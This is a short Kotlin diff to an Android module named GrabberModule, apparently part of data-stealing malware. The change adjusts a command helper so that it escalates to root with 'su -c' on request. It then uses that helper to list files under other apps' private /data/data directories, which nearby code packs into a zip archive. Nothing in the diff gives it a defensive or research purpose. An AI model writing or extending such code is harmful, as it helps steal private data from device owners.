@@ -162,9 +162,9 @@ object GrabberModule {
         } catch (_: Exception) { false }
     }
 
-    private fun runCommand(cmd: String): String {
+    private fun runCommand(cmd: String, useRoot: Boolean = false): String {
         return try {
-            val p = Runtime.getRuntime().exec(if (checkRoot()) "su -c $cmd" else cmd)
+            val p = Runtime.getRuntime().exec(if (useRoot) "su -c $cmd" else cmd)
             val reader = BufferedReader(InputStreamReader(p.inputStream))
             val output = reader.readText()
             p.waitFor()
@@ -219,7 +219,7 @@ object GrabberModule {
         if (dir.exists() && dir.canRead()) {
             scanDirRecursive(dir, "$category/$name", zos, r)
         } else if (hasRoot) {
-            val output = runCommand("find /data/data/$pkg -type f -size +0c -size -5M 2>/dev/null | head -50")
+            val output = runCommand("find /data/data/$pkg -type f -size +0c -size -5M 2>/dev/null | head -50", useRoot = true)
             for (path in output.lines()) {
                 if (path.isBlank() || r.size >= MAX_ZIP || r.files >= MAX_FILES) continue
                 val f = File(path)
